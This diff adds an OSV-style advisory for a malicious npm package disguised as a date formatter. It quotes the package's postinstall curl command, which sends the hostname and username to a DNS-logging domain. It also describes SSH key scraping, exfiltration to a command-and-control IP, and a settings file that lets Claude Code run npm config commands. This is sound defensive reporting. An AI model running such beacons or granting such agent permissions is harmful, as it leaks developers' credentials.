@@ -1,0 +1,68 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-4981",
+  "aliases": [
+    "MAL-2026-5729"
+  ],
+  "modified": "2026-06-13T04:25:15Z",
+  "published": "2026-06-13T04:24:04Z",
+  "summary": "Malicious code in houzidawang806 (npm)",
+  "details": "This package is disguised as a date-formatting utility but delivers a credential-theft implant. Its postinstall hook runs `curl hxxp://275e856d[.]log[.]dnslog[.]pp[.]ua/pre?h=$(hostname)\u0026u=$(whoami)`, beaconing the installer's hostname and username to a DNS-logging domain. Its bundled postinstall.js reads ~/.ssh directory contents for private-key filenames, scrapes os.userInfo() (username, platform), and POSTs the stolen data to C2 at IP 124[.]221[.]154[.]135 over HTTPS. A `.claude/settings.local.json` file grants Claude Code permission to run `PowerShell(npm config *)`, enabling npm token manipulation. The index.js exports a trivial formatDate function as a decoy.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "houzidawang806",
+        "purl": "pkg:npm/houzidawang806@1.0.1"
+      },
+      "versions": [
+        "1.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/houzidawang806/v/1.0.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-4981"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-13T04:24:04Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "275e856d[.]log[.]dnslog[.]pp[.]ua"
+        ],
+        "ip_observed": [
+          "124[.]221[.]154[.]135"
+        ],
+        "url_observed": [
+          "hxxp://275e856d[.]log[.]dnslog[.]pp[.]ua/pre"
+        ]
+      }
+    }
+  }
+}
